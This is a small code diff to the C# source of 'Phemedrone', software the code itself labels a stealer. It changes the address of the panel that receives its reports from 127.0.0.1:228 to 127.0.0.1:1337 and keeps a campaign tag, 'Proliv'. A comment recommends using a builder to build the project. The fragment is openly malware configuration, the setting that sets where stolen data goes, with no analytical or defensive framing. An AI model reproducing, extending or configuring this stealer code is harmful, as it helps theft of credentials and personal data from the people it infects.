@@ -10,7 +10,7 @@ namespace Phemedrone
         
         //i recommend using builder for building project
 
-        public static ISender SenderService = new Panel("127.0.0.1:228");
+        public static ISender SenderService = new Panel("127.0.0.1:1337");
         
         // Stealer Tag
         public static string Tag = "Proliv";
